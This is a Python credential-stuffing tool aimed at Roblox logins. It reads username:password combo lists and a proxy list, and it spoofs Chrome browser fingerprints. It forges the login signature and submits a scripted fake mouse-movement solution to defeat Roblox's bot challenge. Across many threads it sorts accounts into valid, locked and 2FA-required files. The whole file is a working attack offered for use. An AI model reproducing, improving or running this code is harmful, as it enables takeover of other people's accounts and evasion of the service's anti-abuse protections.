from curl_cffi import requests
import base64
import json
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.backends import default_backend
import time
from bs4 import BeautifulSoup
import random
import os
import concurrent.futures
import threading
import colorama
from colorama import Fore, Style

colorama.init(autoreset=True)

lock = threading.Lock()

def save_to_file(filename, content):
    with lock:
        with open(filename, "a") as f:
            f.write(content + "\n")

def load_proxies(filename="proxies.txt"):
    with open(filename, "r") as file:
        proxies = [line.strip() for line in file if line.strip()]
    return proxies

def load_credentials(filename="combo.txt", errors="ignore"):
    with open(filename, "r") as file:
        credentials = []
        for line in file:
            parts = line.strip().split(":")
            if len(parts) == 2:
                credentials.append(parts)
            else:
                print(f"Skipping invalid format: {line.strip()}")
    return credentials

def gen_key_pair():
    priv_key = ec.generate_private_key(ec.SECP256R1(), default_backend())
    pub_key = priv_key.public_key()
    return priv_key, pub_key

def get_spki(pub_key):
    spki_bytes = pub_key.public_bytes(
        encoding=serialization.Encoding.DER,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
    return base64.b64encode(spki_bytes).decode('utf-8')

def sign_data(priv_key, data):
    signature = priv_key.sign(data, ec.ECDSA(hashes.SHA256()))
    return base64.b64encode(signature).decode('utf-8')

def get_csrf_token(session, csrf_url="https://www.roblox.com/"):
    headers_csrf = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "en-US,en;q=0.9",
        "Content-Type": "application/json;charset=UTF-8",
        "Origin": "https://www.roblox.com",
        "Priority": "u=1, i",
        "Referer": "https://www.roblox.com/",
        "Sec-CH-UA": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        "Sec-CH-UA-Mobile": "?0",
        "Sec-CH-UA-Platform": '"Windows"',
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
    }
    response = session.get(csrf_url, headers=headers_csrf)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_meta = soup.find('meta', attrs={'name': 'csrf-token'})
    return csrf_meta['data-token'] if csrf_meta else None

def solve_rostile_challenge(session, headers_login, challenge_metadata_b64, login_payload):
    challenge_metadata_decoded = base64.b64decode(challenge_metadata_b64).decode('utf-8')
    challenge_metadata_json = json.loads(challenge_metadata_decoded)
    challenge_id = challenge_metadata_json.get("challengeId")

    payload = f'{{"challengeId": "{challenge_id}", "solution": {{"buttonClicked": true, "click": {{"x": 989, "y": 503, "timestamp": 10850, "duration": 87}}, "completionTime": 1698, "mouseMovements": [{{"x": 1221, "y": 944, "timestamp": 9535}}, {{"x": 1205, "y": 922, "timestamp": 9557}}, {{"x": 1192, "y": 906, "timestamp": 9585}}, {{"x": 1189, "y": 902, "timestamp": 10092}}, {{"x": 1165, "y": 872, "timestamp": 10119}}, {{"x": 1136, "y": 836, "timestamp": 10140}}, {{"x": 1105, "y": 797, "timestamp": 10161}}, {{"x": 1069, "y": 748, "timestamp": 10188}}, {{"x": 1053, "y": 726, "timestamp": 10210}}, {{"x": 1044, "y": 714, "timestamp": 10237}}, {{"x": 1042, "y": 710, "timestamp": 10260}}, {{"x": 1039, "y": 705, "timestamp": 10283}}, {{"x": 1036, "y": 699, "timestamp": 10306}}, {{"x": 1033, "y": 692, "timestamp": 10328}}, {{"x": 1029, "y": 683, "timestamp": 10355}}, {{"x": 1027, "y": 675, "timestamp": 10376}}, {{"x": 1022, "y": 663, "timestamp": 10403}}, {{"x": 1019, "y": 651, "timestamp": 10425}}, {{"x": 1013, "y": 631, "timestamp": 10453}}, {{"x": 1008, "y": 610, "timestamp": 10479}}, {{"x": 1005, "y": 594, "timestamp": 10500}}, {{"x": 1003, "y": 577, "timestamp": 10521}}, {{"x": 1001, "y": 560, "timestamp": 10543}}, {{"x": 998, "y": 545, "timestamp": 10564}}, {{"x": 995, "y": 530, "timestamp": 10589}}, {{"x": 994, "y": 522, "timestamp": 10611}}, {{"x": 992, "y": 513, "timestamp": 10636}}, {{"x": 991, "y": 507, "timestamp": 10658}}, {{"x": 989, "y": 503, "timestamp": 10682}}], "screenSize": {{"width": 1920, "height": 1080}}, "buttonLocation": {{"x": 780, "y": 495.1875, "width": 360, "height": 48}}, "windowSize": {{"width": 1920, "height": 951}}, "isMobile": false}}}}'

    r = session.post(url="https://apis.roblox.com/rostile/v1/verify", headers=headers_login, data=payload)
    response_json = r.json()
    redemption_token = response_json.get('redemptionToken')

    redemption_token_json = json.dumps({"redemptionToken": redemption_token}, separators=(',', ':'))
    redemption_token_b64 = base64.b64encode(redemption_token_json.encode('utf-8')).decode('utf-8')

    continue_payload = json.dumps({
        "challengeId": challenge_id,
        "challengeType": "rostile",
        "challengeMetadata": json.dumps({"redemptionToken": redemption_token})
    })

    continu = session.post(url="https://apis.roblox.com/challenge/v1/continue", headers=headers_login,
                           data=continue_payload)

    headers_login['rblx-challenge-metadata'] = redemption_token_b64
    headers_login['rblx-challenge-type'] = 'rostile'
    headers_login['rblx-challenge-id'] = challenge_id
    headers_login["x-retry-attempt"] = "1"

    final = session.post(url="https://auth.roblox.com/v2/login", headers=headers_login, json=login_payload)
    return final

def perform_login(username, password, session, proxy, csrf_token, unix, servernonce, priv_key, pub_key):
    client_pub_key = get_spki(pub_key)
    data = f"{client_pub_key}{unix}{servernonce}".encode()
    sai_signature = sign_data(priv_key, data)

    login_url = "https://auth.roblox.com/v2/login"
    headers_login = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "en-US,en;q=0.9",
        "Content-Type": "application/json;charset=UTF-8",
        "Origin": "https://www.roblox.com",
        "Priority": "u=1, i",
        "Cookie": "rbx-ip2=1; RBXEventTrackerV2=CreateDate=09/30/2024 12:15:22&rbxid=&browserid=1727716522212007; GuestData=UserID=-1530676079; RBXSource=rbx_acquisition_time=09/30/2024 17:15:25&rbx_acquisition_referrer=&rbx_medium=Social&rbx_source=&rbx_campaign=&rbx_adgroup=&rbx_keyword=&rbx_matchtype=&rbx_send_info=0; RBXImageCache=timg=p7QWC3w1NZvtdYS88dWeuEWoVXNCO9EhVLG8yTKCGskkp-c31pmh3Dg1dTQmnQmQ7nM0yIXRH29Y5FPa5N3pxlwlP2aFrZhPTn1kDIG443Ws2qNsjXeNPeRlJ2RQ8cVoUL2LGmnnDl8DRJgAEjwtjQASZjXxOXF4sHjEUVdbDjOOhDiRHmaYeHlUkpwpaCKWuyEgHD5WYKVUfXI8r27pzQ; __utma=200924205.801172880.1727716540.1727716540.1727716540.1; __utmb=200924205.0.10.1727716540; __utmc=200924205; __utmz=200924205.1727716540.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)",
        "Referer": "https://www.roblox.com/",
        "Sec-CH-UA": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        "Sec-CH-UA-Mobile": "?0",
        "Sec-CH-UA-Platform": '"Windows"',
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
        "X-Csrf-Token": csrf_token,
    }

    login_payload = {
        "ctype": "Username",
        "cvalue": username,
        "password": password,
        "secureAuthenticationIntent": {
            "clientPublicKey": client_pub_key,
            "clientEpochTimestamp": unix,
            "serverNonce": servernonce,
            "saiSignature": sai_signature
        }
    }

    response_login = session.post(login_url, json=login_payload, headers=headers_login)

    if 'rblx-challenge-type' in response_login.headers and response_login.headers['rblx-challenge-type'] == 'rostile':
        challenge_metadata_b64 = response_login.headers.get('rblx-challenge-metadata')
        if challenge_metadata_b64:
            return solve_rostile_challenge(session, headers_login, challenge_metadata_b64, login_payload)

    return response_login

def worker(username, password, proxies, unix):
    retry_attempts = 1
    valid_file = "valid_accounts.txt"
    invalid_file = "invalid_accounts.txt"
    locked_file = "locked_accounts.txt"
    twofa_file = "2fa_required.txt"

    for attempt in range(retry_attempts):
        proxy = random.choice(proxies)
        proxy_url = f"http://{proxy}"
        session = requests.Session(impersonate="chrome")
        session.proxies = {
            "http": proxy_url,
            "https": proxy_url
        }

        try:
            csrf_token = get_csrf_token(session)
            if not csrf_token:
                continue

            nonce_url = "https://apis.roblox.com/hba-service/v1/getServerNonce"
            req = session.get(url=nonce_url)
            servernonce = req.text.strip('"')

            priv_key, pub_key = gen_key_pair()

            response = perform_login(username, password, session, proxy, csrf_token, unix, servernonce, priv_key, pub_key)

            if "displayName" in response.text or "An unexpected" in response.text:
                save_to_file(valid_file, f"{username}:{password}")
                print(f"{Fore.GREEN}Valid login: {username}")
                return

            elif "Incorrect" in response.text:
                save_to_file(invalid_file, f"{username}:{password}")
                print(f"{Fore.RED}Invalid login: {username}")
                return

            elif "twostep" in response.text:
                save_to_file(twofa_file, f"{username}:{password}")
                print(f"{Fore.YELLOW}2FA Required for: {username}")
                return

            elif "Account has" in response.text:
                save_to_file(locked_file, f"{username}:{password}")
                print(f"{Fore.CYAN}Account locked: {username}")
                return

            elif "Challenge is required":
                save_to_file(locked_file, f"{username}:{password}")
                print(f"{Fore.YELLOW}Account captcha: {username}")
                return
            else:
                pass

        except requests.RequestError as e:
            print(f"{Fore.RED}Proxy error: {proxy}, Attempt: {attempt+1}/{retry_attempts}. Retrying...")
            time.sleep(1)

    print(f"{Fore.RED}Failed to log in after {retry_attempts} attempts: {username}")

def main(num_threads=5):
    credentials = load_credentials()
    proxies = load_proxies()
    unix = int(time.time() * 1000)

    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = []
        for username, password in credentials:
            futures.append(executor.submit(worker, username, password, proxies, unix))

        for future in concurrent.futures.as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f"Error occurred: {e}")

if __name__ == "__main__":
    threads = int(input("Enter the number of threads to use: "))
    main(num_threads=threads)
